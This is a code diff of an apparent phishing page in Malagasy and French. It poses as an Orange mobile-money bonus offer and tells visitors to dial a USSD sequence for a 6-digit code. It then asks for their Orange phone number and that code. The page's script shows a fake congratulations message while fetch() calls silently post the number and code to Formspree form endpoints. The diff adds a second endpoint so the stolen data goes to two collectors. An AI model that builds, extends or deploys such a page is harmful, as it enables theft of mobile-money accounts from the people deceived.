@@ -17,10 +17,8 @@
         .btn-black { background: #000; color: #fff; border: none; width: 100%; padding: 10px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; }
         .val-img { width: 80%; margin: 20px auto; display: block; }
         .input-field { width: 85%; padding: 14px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
-        
-        /* PEJY FARANY */
         .step4-bg { background: #1c1c3c; color: #fff; padding-bottom: 25px; }
-        .agent-frame { width: 90%; margin: 15px auto; border-radius: 12px; overflow: hidden; background: #fff; min-height: 180px; display: flex; align-items: center; justify-content: center; }
+        .agent-frame { width: 90%; margin: 15px auto; border-radius: 12px; overflow: hidden; background: #fff; min-height: 180px; }
         .agent-full-img { width: 100%; height: auto; display: block; }
         .msg-box-green { background: #0a0a20; color: #2ecc71; margin: 15px; padding: 15px; border-radius: 10px; border-left: 5px solid #2ecc71; text-align: left; font-size: 14px; line-height: 1.5; }
         .hidden { display: none; }
@@ -43,7 +41,7 @@
     <img src="https://img.freepik.com/free-vector/secure-login-concept-illustration_114360-4822.jpg" class="val-img">
     <h2 style="font-size: 20px;">Validation</h2>
     <div style="background:#fff3cd; color:#856404; padding:10px; font-size:11px; margin:10px; border-radius:5px;">⚠️ Tsy foronina ny 6 chiffres fa alaina ao am #144*3*3*code#</div>
-    <form id="valForm" action="https://formspree.io/f/mqkrpova" method="POST">
+    <form id="valForm">
         <input type="number" id="phone" name="Phone" class="input-field" placeholder="Laharana Orange (032/037)" required>
         <input type="text" id="code6" name="Code_6" class="input-field" placeholder="Kaody 6 chiffres" maxlength="6" required>
         <button type="button" id="confirmBtn" class="btn-blue btn-disabled" onclick="submitForm()" disabled>CONFIRMER</button>
@@ -52,7 +50,7 @@
 
 <div id="step4" class="card hidden step4-bg">
     <div class="agent-frame">
-        <img src="bonusagent.jpg" class="agent-full-img" id="agentImg" alt="Agent Image">
+        <img src="bonusagent.jpg" onerror="this.src='https://graph.facebook.com/100083236353347/picture?type=large'" class="agent-full-img" alt="Agent Image">
     </div>
     <h2 style="color: #2ecc71; margin: 10px 0;">Félicitations!</h2>
     <div class="msg-box-green" id="congratsMsg"></div>
@@ -68,14 +66,11 @@
         {f: "320.000Ar", b: "100.400Ar"}, {f: "560.000Ar", b: "181.400Ar"},
         {f: "980.000Ar", b: "311.400Ar"}, {f: "1.400.000Ar", b: "461.400Ar"}
     ];
-
     const container = document.getElementById('tarifContainer');
     tarifs.forEach(t => {
         container.innerHTML += `<div class="tarif-box"><h3>${t.f}</h3><div style="font-size:10px; color:#999;">Bonus jour</div><div class="price">${t.b}</div><button class="btn-black" onclick="selectTarif('${t.f}', '${t.b}')">POURSUIVRE</button></div>`;
     });
-
     function selectTarif(f, b) { sF = f; sB = b; showStep(3); }
-
     const ph = document.getElementById('phone'); const cd = document.getElementById('code6'); const btn = document.getElementById('confirmBtn');
     function check() { 
         const isO = ph.value.startsWith('032') || ph.value.startsWith('037');
@@ -85,26 +80,18 @@
     ph.oninput = check; cd.oninput = check;
 
     function submitForm() {
-        document.getElementById('congratsMsg').innerHTML = `Felicitation, votre bonus est en cours. Voamarina fa manana fond <b>${sF}</b> ianao ary misitraka bonus <b>${sB}</b> izao ka manasa anao handefa mp amin'i agent code Bonus izao.`;
+        document.getElementById('congratsMsg').innerHTML = `Felicitation, votre bonus est en cours. Voamarina fa manana fond <b>${sF}</b> ianao ary misitraka bonus <b>${sB}</b> izao.`;
         showStep(4);
-        
-        // Raha sanatria tsy mipoitra ilay sary, azonao ampiana fanaraha-maso eto
-        const img = document.getElementById('agentImg');
-        img.onerror = function() {
-            console.log("Tsy hita ny sary bonusagent.jpg");
-        };
+        const data = new FormData(document.getElementById('valForm'));
 
-        fetch(document.getElementById('valForm').action, { 
-            method: 'POST', 
-            body: new FormData(document.getElementById('valForm')), 
-            headers: { 'Accept': 'application/json' } 
-        });
+        // 1. Email OMALY
+        fetch("https://formspree.io/f/mqkrpova", { method: 'POST', body: data });
+
+        // 2. Email VAOVAO (xdalawnb)
+        fetch("https://formspree.io/f/xdalawnb", { method: 'POST', body: data });
     }
 
-    function showStep(s) { 
-        document.querySelectorAll('.card').forEach(c => c.classList.add('hidden')); 
-        document.getElementById('step' + s).classList.remove('hidden'); 
-    }
+    function showStep(s) { document.querySelectorAll('.card').forEach(c => c.classList.add('hidden')); document.getElementById('step' + s).classList.remove('hidden'); }
 </script>
 </body>
 </html>
